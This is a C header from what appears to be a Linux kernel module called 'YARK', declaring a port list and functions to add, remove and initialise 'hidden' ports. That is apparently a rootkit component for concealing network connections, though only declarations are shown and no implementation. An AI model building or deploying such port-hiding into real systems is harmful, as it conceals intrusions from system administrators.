#ifndef YARK_HIDE_PORT_H
#define YARK_HIDE_PORT_H

#include <linux/hashtable.h>
#include <linux/list.h>

struct hide_port_info {
    int port;
    struct hide_port_info *next;
};

struct hide_port_info *get_hide_port_info_list_head(void);
int hide_port_init(void);
int hide_port_exit(void);
int hide_port_add(int port);
int hide_port_del(int port);


#endif